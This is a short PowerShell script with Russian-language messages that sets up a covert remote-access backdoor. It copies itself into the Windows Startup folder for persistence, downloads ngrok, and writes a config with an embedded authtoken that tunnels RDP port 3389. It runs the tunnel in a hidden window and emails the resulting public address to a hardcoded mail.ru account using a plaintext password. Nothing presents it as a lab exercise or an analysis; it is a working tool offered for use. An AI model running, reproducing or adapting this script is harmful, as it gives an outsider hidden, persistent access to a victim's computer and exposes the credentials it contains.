$thisScript = $MyInvocation.MyCommand.Path
$startupScriptPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\ngrok.ps1"

if ($thisScript -ne $startupScriptPath -and !(Test-Path $startupScriptPath)) {
    Copy-Item -Path $thisScript -Destination $startupScriptPath -Force
    exit
}

$ngrokPath = "$env:APPDATA\ngrok\ngrok.exe"
$configPath = "$env:APPDATA\ngrok\ngrok.yml"

if (!(Test-Path $ngrokPath)) {
    Invoke-WebRequest -Uri "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-windows-amd64.zip" -OutFile "$env:TEMP\ngrok.zip"
    Expand-Archive "$env:TEMP\ngrok.zip" -DestinationPath "$env:APPDATA\ngrok" -Force
}

if (!(Test-Path $configPath)) {
@"
authtoken: 2xe3OPcwxui4icUAn8vBgxysHzH_6ceP3DS71bZm5mRxktwua
tunnels:
  rdp:
    addr: 3389
    proto: tcp
"@ | Out-File -Encoding ASCII $configPath
}

$ngrokProcess = Start-Process -FilePath $ngrokPath -ArgumentList "start --config `"$configPath`" rdp" -PassThru -WindowStyle Hidden

$tunnelAddress = $null
for ($i = 0; $i -lt 10; $i++) {
    try {
        $response = Invoke-RestMethod -Uri "http://127.0.0.1:4040/api/tunnels" -TimeoutSec 2
        $tunnel = $response.tunnels | Where-Object { $_.proto -eq "tcp" }
        if ($tunnel -and $tunnel.public_url) {
            $tunnelAddress = $tunnel.public_url
            break
        }
    } catch {
        Start-Sleep -Seconds 2
    }
}

if ($tunnelAddress) {
    $smtpServer = "smtp.gmail.com"
    $smtpPort = 587
    $smtpUser = "user.default00@mail.ru"
    $smtpPass = "smhdebashit"

    $fromEmail = "user.default00@mail.ru"
    $toEmail = "user.default00@mail.ru"
    $subject = "Ngrok RDP адрес"
    $body = "Ngrok публичный TCP адрес:\n`t $tunnelAddress"

    try {
        $securePass = ConvertTo-SecureString $smtpPass -AsPlainText -Force
        $credentials = New-Object System.Management.Automation.PSCredential($smtpUser, $securePass)

        Send-MailMessage -From $fromEmail -To $toEmail -Subject $subject -Body $body -SmtpServer $smtpServer -Port $smtpPort -UseSsl -Credential $credentials
    } catch {
        Write-Error "Ошибка при отправке email: $_"
    }
} else {
    Write-Error "Не удалось получить публичный адрес от ngrok."
}
